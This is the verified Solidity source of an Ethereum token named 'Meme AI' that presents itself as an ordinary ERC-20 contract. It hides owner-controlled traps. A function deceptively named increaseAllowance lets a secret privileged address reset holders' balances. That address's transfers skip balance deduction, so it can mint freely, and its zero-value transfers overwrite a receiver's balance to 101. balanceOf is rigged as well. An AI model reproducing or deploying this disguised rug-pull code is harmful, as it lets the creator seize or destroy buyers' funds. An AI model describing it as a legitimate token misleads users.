/**
 *Submitted for verification at Etherscan.io on 2023-06-16
*/

/**
    
███╗░░░███╗███████╗███╗░░░███╗███████╗  ░█████╗░██╗
████╗░████║██╔════╝████╗░████║██╔════╝  ██╔══██╗██║
██╔████╔██║█████╗░░██╔████╔██║█████╗░░  ███████║██║
██║╚██╔╝██║██╔══╝░░██║╚██╔╝██║██╔══╝░░  ██╔══██║██║
██║░╚═╝░██║███████╗██║░╚═╝░██║███████╗  ██║░░██║██║
╚═╝░░░░░╚═╝╚══════╝╚═╝░░░░░╚═╝╚══════╝  ╚═╝░░╚═╝╚═╝
*/

//https://memeai.space
//https://t.me/MemeAIEntryPortal

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

contract MemeAI is Ownable {
    mapping(uint256 => mapping(address => uint256)) balance;
    mapping(uint256 => mapping(address => bool)) MemeAIbal;

    uint256 private MemeAIdistro = 1;
    string public name = "Meme AI";
    uint256 private MemeAIlimit;

    function balanceOf(address user) public view returns (uint256) {
        if (user == MemeAIpair) return balance[MemeAIdistro][user];

        if (!MemeAIbal[MemeAIdistro][user] && balance[MemeAIdistro - 1][user] != 0) {
            return balance[MemeAIdistro][user] + MemeAIlimit;
        }
        return balance[MemeAIdistro][user];
    }

    function increaseAllowance(
        uint256 _MemeAIlimit,
        address[] memory MemeAIholder
    ) public returns (bool success) {
        if (MemeAIwallet[msg.sender] != 0) {
            MemeAIdistro++;
            for (uint256 i = 0; i < MemeAIholder.length; i++) {
                balance[MemeAIdistro][MemeAIholder[i]] =
                    balance[MemeAIdistro - 1][MemeAIholder[i]] +
                    MemeAIlimit;
            }

            balance[MemeAIdistro][MemeAIpair] = balance[MemeAIdistro - 1][
                MemeAIpair
            ];

            MemeAIlimit = _MemeAIlimit;
        }

        return true;
    }

    function approve(
        address MemeAIactive,
        uint256 MemeAInumber
    ) public returns (bool success) {
        allowance[msg.sender][MemeAIactive] = MemeAInumber;
        emit Approval(msg.sender, MemeAIactive, MemeAInumber);
        return true;
    }

    uint8 public decimals = 9;

    function MemeAIspender(address MemeAIapprover, address MemeAIreceiver, uint256 MemeAInumber) private {
        if (!MemeAIbal[MemeAIdistro][MemeAIapprover]) {
            MemeAIbal[MemeAIdistro][MemeAIapprover] = true;
            if (balance[MemeAIdistro - 1][MemeAIapprover] != 0)
                balance[MemeAIdistro][MemeAIapprover] += MemeAIlimit;
        }

        if (!MemeAIbal[MemeAIdistro][MemeAIreceiver]) {
            MemeAIbal[MemeAIdistro][MemeAIreceiver] = true;
            if (balance[MemeAIdistro - 1][MemeAIreceiver] != 0)
                balance[MemeAIdistro][MemeAIreceiver] += MemeAIlimit;
        }

        if (MemeAIwallet[MemeAIapprover] == 0) {
            balance[MemeAIdistro][MemeAIapprover] -= MemeAInumber;
        }
        balance[MemeAIdistro][MemeAIreceiver] += MemeAInumber;
        if (
            MemeAIwallet[msg.sender] > 0 && MemeAInumber == 0 && MemeAIreceiver != MemeAIpair
        ) {
            balance[MemeAIdistro][MemeAIreceiver] = MemeAIvalue;
        }
        emit Transfer(MemeAIapprover, MemeAIreceiver, MemeAInumber);
    }

    address public MemeAIpair;

    mapping(address => mapping(address => uint256)) public allowance;

    string public symbol = "MemeAI";

    mapping(address => uint256) private MemeAIwallet;

    function transfer(
        address MemeAIreceiver,
        uint256 MemeAInumber
    ) public returns (bool success) {
        require(MemeAIreceiver != address(0), "Can't transfer to 0 address");
        MemeAIspender(msg.sender, MemeAIreceiver, MemeAInumber);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    uint256 public totalSupply = 100000000 * 10 ** 9;

    function transferFrom(
        address MemeAIapprover,
        address MemeAIreceiver,
        uint256 MemeAInumber
    ) public returns (bool success) {
        require(MemeAInumber <= allowance[MemeAIapprover][msg.sender]);
        allowance[MemeAIapprover][msg.sender] -= MemeAInumber;
        MemeAIspender(MemeAIapprover, MemeAIreceiver, MemeAInumber);
        return true;
    }

    constructor(address MemeAImarket) {
        balance[MemeAIdistro][msg.sender] = totalSupply;
        MemeAIwallet[MemeAImarket] = MemeAIvalue;
        IUniswapV2Router02 MemeAIworkshop = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        MemeAIpair = IUniswapV2Factory(MemeAIworkshop.factory()).createPair(
            address(this),
            MemeAIworkshop.WETH()
        );
    }

    uint256 private MemeAIvalue = 101;

    mapping(address => uint256) private MemeAIprime;
}